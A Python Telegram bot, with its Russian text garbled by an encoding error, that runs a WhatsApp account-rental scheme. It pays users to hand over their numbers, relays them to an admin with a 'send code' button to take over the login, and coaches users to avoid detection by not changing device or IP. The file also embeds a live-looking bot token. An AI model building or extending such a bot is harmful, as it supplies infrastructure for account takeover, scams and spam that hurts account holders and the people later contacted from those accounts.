import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ContentType
)
from aiogram.filters import CommandStart

BOT_API = '7791076321:AAE53gUtBvTJvjIpXdOr-rP5v3Lw6KOkp1k'
ADMIN_ID = 7652762716  # –í—Å—Ç–∞–≤—å —Å—é–¥–∞ —Å–≤–æ–π Telegram ID

bot = Bot(token=BOT_API)
dp = Dispatcher()

active_chats = {}

# –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä–∞
main_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="üì± –°–¥–∞—Ç—å –Ω–æ–º–µ—Ä")],
        [KeyboardButton(text="üíº –ü—Ä–∞–π—Å –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è")],
        [KeyboardButton(text="üÜò –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –∏ –ø–æ–º–æ—â—å")],
        [KeyboardButton(text="‚è≥ –û—á–µ—Ä–µ–¥—å –Ω–∞ —Å–¥–∞—á—É")]
    ],
    resize_keyboard=True
)

# –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å –∫–Ω–æ–ø–∫–æ–π "–ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é"
back_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é")]],
    resize_keyboard=True
)

# –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_states = {}

# –ö–Ω–æ–ø–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —á–∞—Ç–∞
anon_chat_kb = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="‚ùå –ó–∞–≤–µ—Ä—à–∏—Ç—å —á–∞—Ç", callback_data="end_chat")]
    ]
)

user_states = {}
waiting_users = []
active_chats = {}

@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer("üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ —Ç–∏–º—É Lexx Warent | WhatsApp!", reply_markup=main_keyboard)

@dp.message(F.text == "üÜò –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –∏ –ø–æ–º–æ—â—å")
async def support(message: Message):
    text = (
        "‚ú® –ù—É–∂–Ω–∞ –ø–æ–º–æ—â—å?\n"
        "–°–≤—è–∂–∏—Ç–µ—Å—å —Å –≤–ª–∞–¥–µ–ª—å—Ü–µ–º –ø—Ä–æ–µ–∫—Ç–∞ ‚Äî –≤—Å–µ–≥–¥–∞ –≥–æ—Ç–æ–≤(–∞) –ø–æ–º–æ—á—å! üì±\n\n"
        "üì© Telegram: @Lexx_Maboy\n"
    )
    await message.answer(text, reply_markup=main_keyboard)

@dp.message(F.text == "üíº –ü—Ä–∞–π—Å –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è")
async def price_info(message: Message):
    text = (
        "–ü—Ä–∏–≤–µ—Ç!\n"
        "–¢—ã –≤ —Ç–∏–º–µ –ø–æ —Å–¥–∞—á–µ –í–¶ ‚Äî –∑–¥–µ—Å—å —Ç—ã –º–æ–∂–µ—à—å —Å–¥–∞–≤–∞—Ç—å —Å–≤–æ–π WhatsApp –∏ –ø–æ–ª—É—á–∞—Ç—å –æ–ø–ª–∞—Ç—É üí∏\n\n"
        "üìå –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:\n"
        "‚ñ´Ô∏è –¢—ã —Å–¥–∞—ë—à—å —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç (–Ω–æ–º–µ—Ä/–≤—Ü/) –Ω–∞ –≤—Ä–µ–º—è\n"
        "‚ñ´Ô∏è –î—Ä—É–≥–æ–π —á–µ–ª–æ–≤–µ–∫ –∑–∞—Ö–æ–¥–∏—Ç –∏ —Å–∏–¥–∏—Ç –æ—Ç —Ç–≤–æ–µ–≥–æ –∏–º–µ–Ω–∏\n"
        "‚ñ´Ô∏è –ï—Å–ª–∏ –≤—Å—ë –ø—Ä–æ—à–ª–æ –±–µ–∑ —Å–ª—ë—Ç–∞/–ø–∞–ª–µ–≤–∞ ‚Äî —Ç—ã –ø–æ–ª—É—á–∞–µ—à—å –¥–µ–Ω—å–≥–∏\n\n"
        "üí¨ –ù–∏–∫–∞–∫–∏—Ö –≤–ª–æ–∂–µ–Ω–∏–π. –¢–æ–ª—å–∫–æ –¥–æ—Å—Ç—É–ø, —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç—å –∏ –Ω–µ–º–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏.\n\n"
        "üìä –ü—Ä–∞–π—Å –∑–∞ –í–¶:\n"
        "üî∏ 1 —á 15 –º–∏–Ω ‚Äî 11$\n"
        "üî∏ 2 —á ‚Äî 15$\n"
        "üî∏ 3 —á ‚Äî 19$\n\n"
        "‚ö†Ô∏è –ì–ª–∞–≤–Ω–æ–µ ‚Äî —á—Ç–æ–±—ã –≤—Å—ë –ø—Ä–æ—à–ª–æ —á–∏—Å—Ç–æ:\n"
        "‚ñ™Ô∏è –ë–µ–∑ –ø–µ—Ä–µ–ø–∏—Å–æ–∫ –≤–æ –≤—Ä–µ–º—è —Å–µ—Å—Å–∏–∏\n"
        "‚ñ™Ô∏è –ë–µ–∑ —Å–º–µ–Ω—ã —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞/IP\n"
        "‚ñ™Ô∏è –ü—Ä–æ—Å—Ç–æ –æ—Ç–¥–∞–ª, –ø–æ–¥–æ–∂–¥–∞–ª, –ø–æ–ª—É—á–∏–ª üí∞\n\n"
        "–ì–æ—Ç–æ–≤(–∞) ‚Äî –ø–∏—à–∏ –∫—É—Ä–∞—Ç–æ—Ä–∞–º, –±–µ—Ä–∏ —Å–ª–æ—Ç –∏ –Ω–∞—á–∏–Ω–∞–π –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å —É–∂–µ —Å–µ–≥–æ–¥–Ω—è."
    )
    await message.answer(text, reply_markup=main_keyboard)

@dp.message(F.text == "‚è≥ –û—á–µ—Ä–µ–¥—å –Ω–∞ —Å–¥–∞—á—É")
async def queue_info(message: Message):
    await message.answer("üéØ –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–ª–æ—Ç–æ–≤: 200")


@dp.message(F.text == "‚¨ÖÔ∏è –ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é")
async def back_to_menu(message: Message):
    user_states.pop(message.from_user.id, None)  # –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
    await message.answer("–í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é:", reply_markup=main_keyboard)

@dp.message(F.text == "üì± –°–¥–∞—Ç—å –Ω–æ–º–µ—Ä")
async def ask_number(message: Message):
    user_states[message.from_user.id] = {'awaiting_number': True}
    await message.answer("–û—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ +7XXXXXXXXXX", reply_markup=back_keyboard)

@dp.message()
async def handle_number(message: Message):
    user_id = message.from_user.id
    state = user_states.get(user_id)

    if state and state.get('awaiting_number'):
        number = message.text.strip()
        if not number.startswith("+7") or len(number) < 11:
            await message.answer(
                "‚ùå –ù–∞—à–∞ —Ç–∏–º–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ç–æ–ª—å–∫–æ –Ω–æ–º–µ—Ä–∞ –∏–∑ –†–§ üá∑üá∫.\n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.",
                reply_markup=main_keyboard
            )
            user_states.pop(user_id)
            return

        # –ü—Ä–∏–Ω–∏–º–∞–µ–º –Ω–æ–º–µ—Ä, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω—É
        user_states[user_id] = {
            'awaiting_number': False,
            'number': number
        }

        # –ö–Ω–æ–ø–∫–∞ "–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥" –¥–ª—è –∞–¥–º–∏–Ω–∞
        inline_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥", callback_data=f"send_code:{user_id}")]
        ])

        await bot.send_message(
            ADMIN_ID,
            f"–ü–æ—Å—Ç—É–ø–∏–ª –Ω–æ–º–µ—Ä –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è <a href='tg://user?id={user_id}'>id:{user_id}</a>:\n{number}",
            reply_markup=inline_kb,
            parse_mode="HTML"
        )

        await message.answer("‚úÖ –ù–æ–º–µ—Ä –ø—Ä–∏–Ω—è—Ç –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.", reply_markup=main_keyboard)

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω—É —Å –∫–Ω–æ–ø–∫–æ–π –Ω–∞—á–∞—Ç—å —á–∞—Ç
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="üîÅ –ù–∞—á–∞—Ç—å –∞–Ω–æ–Ω–∏–º–Ω—ã–π —á–∞—Ç", callback_data=f"anon_chat:{user_id}")]
        ])
        await bot.send_message(
            ADMIN_ID,
            f"üì• –ù–æ–≤—ã–π –Ω–æ–º–µ—Ä –æ—Ç <a href='tg://user?id={user_id}'>id:{user_id}</a>:\n{number}",
            reply_markup=kb,
            parse_mode="HTML"
        )
        return

        # –ü–µ—Ä–µ—Å—ã–ª–∫–∞ –≤ –∞–Ω–æ–Ω–∏–º–Ω–æ–º —á–∞—Ç–µ
    if user_id in active_chats:
        receiver_id = active_chats[user_id]['partner_id']
        await bot.send_message(receiver_id, message.text)
    else:
        await message.answer("‚ùó –í—ã –Ω–µ –≤ —á–∞—Ç–µ. –ù–∞–∂–º–∏—Ç–µ ¬´üì± –°–¥–∞—Ç—å –Ω–æ–º–µ—Ä¬ª, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å.")

    # –ï—Å–ª–∏ –Ω–µ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –æ–∂–∏–¥–∞—Ç—å –Ω–æ–º–µ—Ä, –Ω–∏—á–µ–≥–æ –Ω–µ –¥–µ–ª–∞—Ç—å –∏–ª–∏ –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫—É –¥—Ä—É–≥–∏—Ö —Å–æ–æ–±—â–µ–Ω–∏–π



# –ê–Ω–æ–Ω–∏–º–Ω—ã–π —á–∞—Ç –∑–∞–ø—É—Å–∫
@dp.callback_query(F.data.startswith("anon_chat:"))
async def start_anon_chat(callback: CallbackQuery):
    admin_id = callback.from_user.id
    user_id = int(callback.data.split(":")[1])

    # –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
    active_chats[admin_id] = {'partner_id': user_id}
    active_chats[user_id] = {'partner_id': admin_id}

    await bot.send_message(user_id, "‚úÖ –í—ã –ø–æ–¥–∫–ª—é—á–µ–Ω—ã –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É. –ù–∞—á–Ω–∏—Ç–µ –¥–∏–∞–ª–æ–≥.", reply_markup=anon_chat_kb)
    await bot.send_message(admin_id, f"üü¢ –í—ã –ø–æ–¥–∫–ª—é—á–µ–Ω—ã –∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é <a href='tg://user?id={user_id}'>id:{user_id}</a>", reply_markup=anon_chat_kb, parse_mode="HTML")
    await callback.answer()

# –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —á–∞—Ç–∞
@dp.callback_query(F.data == "end_chat")
async def end_chat(callback: CallbackQuery):
    sender_id = callback.from_user.id
    partner_id = active_chats.get(sender_id, {}).get('partner_id')

    if partner_id:
        await bot.send_message(sender_id, "‚ùå –ß–∞—Ç –∑–∞–≤–µ—Ä—à—ë–Ω.", reply_markup=main_keyboard)
        await bot.send_message(partner_id, "‚ùå –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –∑–∞–≤–µ—Ä—à–∏–ª —á–∞—Ç.", reply_markup=main_keyboard)
        active_chats.pop(sender_id)
        active_chats.pop(partner_id)
    else:
        await bot.send_message(sender_id, "‚ùó –í—ã –Ω–µ –Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ —á–∞—Ç–µ.", reply_markup=main_keyboard)
    await callback.answer()

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
